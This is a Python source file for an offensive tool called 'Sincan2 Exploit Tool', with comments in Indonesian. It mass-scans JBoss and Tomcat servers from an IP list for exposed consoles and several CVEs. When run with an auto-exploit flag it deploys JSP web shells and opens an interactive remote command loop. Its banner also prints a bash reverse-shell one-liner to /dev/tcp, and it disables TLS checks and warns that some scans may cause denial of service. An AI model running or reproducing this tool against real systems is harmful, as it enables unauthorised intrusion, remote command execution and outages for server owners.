#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Sincan2: Sincan2 verify and EXploitation Tool (MODULAR & INTERACTIVE SHELL VERSION)
Original: https://github.com/sincan2
"""
import textwrap
import traceback
import logging
import datetime
import signal
import _exploits
import _updates
from os import name, system, path as os_path
import os, sys
from time import sleep
from random import randint
import argparse, socket
from sys import argv, exit, version_info
from urllib.parse import quote_plus, urlparse
import warnings # For suppressing InsecureRequestWarning

# Suppress InsecureRequestWarning from requests and urllib3
try:
    import requests
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

try:
    from urllib3.exceptions import InsecureRequestWarning
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
except ImportError:
    pass

# Menonaktifkan pembuatan file log
logging.captureWarnings(True)

__author__ = "MHL TEAM (Original), Sincan2 (Refactoring)"
__version__ = "3.7.2 (Sincan2)"

# Definisi warna
RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
YELLOW = '\033[1;33m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

# Import pustaka modern
try:
    from urllib3.util import Timeout
    from urllib3 import PoolManager, ProxyManager, make_headers
    from urllib3.exceptions import MaxRetryError, NewConnectionError, ReadTimeoutError
except ImportError:
    print(f"{RED1}{BOLD}\n * Pustaka 'urllib3' tidak ditemukan. Silakan install dengan 'pip install urllib3'.\n{ENDC}")
    exit(1)

try:
    import requests
except ImportError:
    print(f"{RED1}{BOLD}\n * Pustaka 'requests' tidak ditemukan. Silakan install dengan 'pip install requests'.\n{ENDC}")
    exit(1)

# Variabel Global
gl_interrupted = False
gl_args = None
gl_http_pool = None

def print_and_flush(message, same_line=False):
    """Fungsi print yang kompatibel dengan Python 2/3 dan melakukan flush."""
    print(message, end='' if same_line else '\n', flush=True)

def get_random_user_agent():
    """Menyediakan User-Agent modern secara acak."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    ]
    return user_agents[randint(0, len(user_agents) - 1)]

# Menonaktifkan mekanisme retry untuk mencegah "hang"
def configure_http_pool():
    """Mengonfigurasi koneksi HTTP Pool berdasarkan argumen."""
    global gl_http_pool
    timeout = Timeout(connect=gl_args.timeout, read=gl_args.timeout * 2)
    # Menambahkan retries=False untuk mencegah coba lagi pada koneksi yang gagal
    if gl_args.proxy:
        gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE', retries=False)
    else:
        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE', retries=False)

    warnings.filterwarnings("ignore", category=InsecureRequestWarning)


def handler_interrupt(signum, frame):
    """Menangani interupsi Ctrl+C."""
    global gl_interrupted
    gl_interrupted = True
    print_and_flush("\nProses dihentikan oleh pengguna...")
    exit(1)

signal.signal(signal.SIGINT, handler_interrupt)

def print_shell_banner(url):
    """Menampilkan banner informasi shell."""
    print(f"\n{BOLD}{GREEN}╔════════════════════════════════════════════════════════════╗")
    print(f"║       Sincan2 Interactive Shell                                ║")
    print(f"╠════════════════════════════════════════════════════════════╣")
    print(f"║ {BLUE}Target Shell:{ENDC} {url.ljust(52)}║")
    print(f"║ {BLUE}Ketik Perintah:{ENDC} 'id', 'ls -la', 'whoami', dll.                   ║")
    print(f"║ {BLUE}Untuk Keluar:{ENDC}   Ketik 'exit' atau 'keluar'                      ║")
    print(f"║ {BLUE}JexRemote:{ENDC}      jexremote=IPMU:PORT                           ║")
    print(f"║ {BLUE}Reverse Shell:{ENDC}  /bin/bash -i > /dev/tcp/IPMU/PORT 0>&1 2>&1   ║")
    print(f"{BOLD}{GREEN}╚════════════════════════════════════════════════════════════╝{ENDC}\n")

def parse_shell_output(raw_text):
    """Mencoba mem-parsing output mentah dari web shell."""
    try:
        if '<pre>' in raw_text:
            output = raw_text.split('<pre>')[1].split('</pre>')[0]
        elif '<body>' in raw_text:
            output = raw_text.split('<body>')[1].split('</body>')[0]
        else:
            output = raw_text
        return output.strip()
    except IndexError:
        return raw_text.strip()
    except Exception:
        return "Gagal mem-parsing output dari server."

def shell_loop(base_url):
    """Memulai loop shell interaktif."""
    print_shell_banner(base_url)
    session = requests.Session()
    session.verify = False
    while True:
        try:
            command = input(f"{BOLD}{BLUE}Sincan2 > {ENDC}")
            if command.lower().strip() in ['exit', 'keluar']:
                break
            if not command.strip():
                continue
            encoded_command = quote_plus(command)
            separator = '&' if '?' in base_url else '?'
            target_url = f"{base_url}{separator}ppp={encoded_command}"
            response = session.get(target_url, timeout=30, verify=False)
            if response.status_code == 200:
                cleaned_output = parse_shell_output(response.text)
                print(cleaned_output)
            else:
                print(f"{RED}Error: Server merespons dengan status {response.status_code}{ENDC}")
        except requests.exceptions.RequestException as e:
            print(f"{RED}Error koneksi: {e}{ENDC}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"{RED}Terjadi error tak terduga: {e}{ENDC}")
    print(f"\n{GREEN}Sesi shell dihentikan. Kembali ke program utama...{ENDC}")

def check_vul(url):
    """Fungsi utama untuk memeriksa semua vektor kerentanan."""
    parsed_main_url = urlparse(url)
    if not parsed_main_url.scheme:
        url = "http://" + url
        parsed_main_url = urlparse(url)

    print_and_flush(GREEN + f"\n ** Memeriksa Host: {url} **\n" + ENDC)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive", "User-Agent": get_random_user_agent()}
    paths = {"sincan2-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo", "web-console": "/web-console/ServerInfo.jsp", "Sincan2InvokerServlet": "/invoker/JMXInvokerServlet"}
    if gl_args.scan_modern_vulns:
        print_and_flush(BLUE + "[INFO] Menambahkan Pengecekan Vektor Modern..." + ENDC)
        paths["ROP PELOR Memory Leak (CVE-2022-0853)"] = ""
        paths["Undertow AJP Overflow (CVE-2023-5379)"] = ""
        paths["Undertow FormAuth DoS (CVE-2023-1973)"] = ""
        paths["Spoofed Data Bypass (CVE-2023-6236)"] = ""
        paths["Apache Tomcat Path Traversal (CVE-2025-24813)"] = ""
    results = {}
    for vector, path in paths.items():
        if gl_interrupted: break
        print_and_flush(GREEN + f" [*] Memeriksa {vector:<45}" + ENDC, same_line=True)
        try:
            if "CVE-" in vector:
                if "CVE-2022-0853" in vector: res = _exploits.test_jta_loop(url, headers)
                elif "CVE-2023-5379" in vector: res = _exploits.send_ajp_oversize_header(url, headers)
                elif "CVE-2023-1973" in vector: res = _exploits.post_large_form(url, headers)
                elif "CVE-2023-6236" in vector: res = _exploits.send_spoofed_data(url, headers)
                elif "CVE-2025-24813" in vector: res = _exploits.exploit_tomcat_cve_2025_24813(url, headers)

                if res['status'] == 'vulnerable':
                    print_and_flush(RED + f"  [ RENTAN ]" + ENDC)
                    if "CVE-2025-24813" in vector:
                        exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/mhl.jsp?cmd=id"
                        print_and_flush(f"    {YELLOW}└─> Coba eksploitasi: {exploit_url}{ENDC}")
                    results[vector] = 200
                elif res['status'] in ['timeout', 'connection_error', 'failed_put', 'failed_get', 'error']:
                    print_and_flush(RED + f"  [ GAGAL / ERROR ]" + ENDC); results[vector] = 505
                else:
                    print_and_flush(GREEN + "  [ OK ]" + ENDC); results[vector] = 404
            else:
                r = gl_http_pool.request('HEAD', url + path, headers=headers)
                if r.status in [200, 500]:
                    print_and_flush(RED + "  [ RENTAN ]" + ENDC); results[vector] = 200
                else:
                    print_and_flush(GREEN + "  [ OK ]" + ENDC); results[vector] = 404
        except Exception as e:
            # Mengubah pesan error agar lebih ringkas
            error_type = type(e).__name__
            print_and_flush(f"{RED} [ TIMEOUT / ERROR: {error_type} ]{ENDC}")
            results[vector] = 505
    return results

def auto_exploit(url, vector):
    """Memilih dan menjalankan fungsi eksploitasi, lalu masuk ke shell interaktif jika berhasil."""
    print_and_flush(GREEN + f"\n [ + ] Mencoba eksploitasi otomatis via {vector}. Mohon tunggu..." + ENDC)
    success = False
    shell_path = "/jexws4/jexws4.jsp"
    if vector == "sincan2-console":
        success = _exploits.exploit_jmx_console_file_repository(url)
        if not success: success = _exploits.exploit_jmx_console_main_deploy(url)
    elif vector == "web-console": success = _exploits.exploit_web_console_invoker(url)
    elif vector == "Sincan2InvokerServlet":
        shell_path = "/jexinv4/jexinv4.jsp"
        success = _exploits.exploit_jmx_invoker_file_repository(url)
    if success:
        print_and_flush(GREEN + f" [ SUCCESS ] Kode berhasil di-deploy! Shell tersedia di {shell_path}" + ENDC)
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        full_shell_url = base_url + shell_path
        shell_loop(full_shell_url)
        return True
    else:
        print_and_flush(RED + " [ FAILED ] Gagal mengeksploitasi via vektor ini."+ ENDC)
        return False

def banner():
    """Menampilkan banner statis."""
    system('cls' if name == 'nt' else 'clear')
    banner_text = f"""
{RED1}
|  \\     /  \\|  \\  |  \\|  \\            |        \\|        \\ /      \\ |  \\     /  \\
| $$\\   /  $$| $$  | $$| $$             \\$$$$$$$$| $$$$$$$$|  $$$$$$\\| $$\\   /  $$
| $$$\\ /  $$$| $$__| $$| $$               | $$   | $$__    | $$__| $$| $$$\\ /  $$$
| $$$$\\  $$$$| $$    $$| $$               | $$   | $$  \\   | $$    $$| $$$$\\  $$$$
| $$\\$$ $$ $$| $$$$$$$$| $$               | $$   | $$$$$   | $$$$$$$$| $$\\$$ $$ $$
| $$ \\$$$| $$| $$  | $$| $$_____          | $$   | $$_____ | $$  | $$| $$ \\$$$| $$
| $$  \\$ | $$| $$  | $$| $$     \\         | $$   | $$     \\| $$  | $$| $$  \\$ | $$
 \\$$      \\$$ \\$$   \\$$ \\$$$$$$$$          \\$$    \\$$$$$$$$ \\$$   \\$$ \\$$      \\$$
{YELLOW}
                  Sincan2 Exploit Tool v{__version__}
                           - by MHL TEAM -
{ENDC}
"""
    print_and_flush(banner_text)


if __name__ == "__main__":
    # PERUBAHAN: Banner dipanggil secara tidak kondisional di sini
    banner()

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"Sincan2 v{__version__} - Alat verifikasi dan eksploitasi Sincan2.",
        epilog=textwrap.dedent('''\
        Contoh Penggunaan:
          - Target Tunggal:
            python3 %(prog)s -u http://target.com:8080 -M --auto-exploit

          - Target Massal dari File:
            python3 %(prog)s -f list_ip.txt -p 8088 -M --auto-exploit
        '''))

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-u", "--host", help="Host target tunggal (contoh: http://127.0.0.1:8080)")
    target_group.add_argument("-f", "--file", help="File yang berisi daftar IP/hostname, satu per baris")

    parser.add_argument("-p", "--port", type=int, help="Port yang akan digunakan untuk semua host dari file (diperlukan jika -f digunakan)")
    parser.add_argument("--proxy", help="Gunakan proxy HTTP (contoh: http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=5, help="Waktu tunggu koneksi dalam detik (default: 5)")
    parser.add_argument("--auto-exploit", action="store_true", help="Coba eksploitasi otomatis dan buka shell interaktif jika berhasil.")
    
    # PERUBAHAN: Argumen --no-banner dihapus
    
    group_modern = parser.add_argument_group('Opsi Pengecekan Modern')
    group_modern.add_argument("-M", "--scan-modern-vulns", action='store_true', help="Jalankan modul pengecekan modern (CVE 2022-2025). PERINGATAN: Berpotensi DoS.")

    gl_args = parser.parse_args()

    if gl_args.file and not gl_args.port:
        parser.error("-p/--port wajib digunakan bersama -f/--file.")

    targets_to_scan = []
    if gl_args.host:
        targets_to_scan.append(gl_args.host)
    else:
        if not os_path.exists(gl_args.file):
            print_and_flush(f"{RED}[ERROR] File tidak ditemukan: {gl_args.file}{ENDC}")
            exit(1)
        with open(gl_args.file, 'r') as f:
            for line in f:
                ip = line.strip()
                if ip:
                    targets_to_scan.append(f"http://{ip}:{gl_args.port}")

    configure_http_pool()
    _exploits.set_http_pool(gl_http_pool)
    _updates.set_http_pool(gl_http_pool)

    # PERUBAHAN: Pesan info digeser setelah pemanggilan banner
    print_and_flush(f"\n{BLUE}[INFO] Akan memindai {len(targets_to_scan)} target dengan timeout {gl_args.timeout} detik...{ENDC}")

    for target_url in targets_to_scan:
        if gl_interrupted:
            print_and_flush(f"{RED}[INFO] Pemindaian massal dihentikan.{ENDC}")
            break

        scan_results = check_vul(target_url)
        vulnerables = [k for k, v in scan_results.items() if v == 200]

        if not vulnerables:
            print_and_flush(GREEN + f"[+] Selesai untuk {target_url}. Tidak ada kerentanan yang jelas ditemukan." + ENDC)
        else:
            print_and_flush(RED + f"\n[!] Ditemukan potensi kerentanan pada {target_url}: {', '.join(vulnerables)}" + ENDC)

            if gl_args.auto_exploit:
                exploited = False
                for vector in vulnerables:
                    if exploited: break
                    if "CVE-2025-24813" in vector:
                        print_and_flush(GREEN + f"\n [ SUCCESS ] RCE via {vector} berhasil! Shell tersedia di /mhl.jsp" + ENDC)
                        parsed_url = urlparse(target_url)
                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                        shell_loop(base_url + "/mhl.jsp")
                        exploited = True
                    elif "CVE" not in vector:
                        if auto_exploit(target_url, vector):
                            exploited = True
                if exploited:
                    print_and_flush(BOLD + GREEN + f"\n[!!!] Eksploitasi Berhasil untuk {target_url}! Sesi shell ditutup." + ENDC)
            else:
                print_and_flush(BLUE + "[INFO] Untuk mencoba eksploitasi, jalankan kembali perintah dengan flag --auto-exploit" + ENDC)

    print_and_flush(f"\n{BLUE}[INFO] Semua target telah selesai dipindai.{ENDC}")
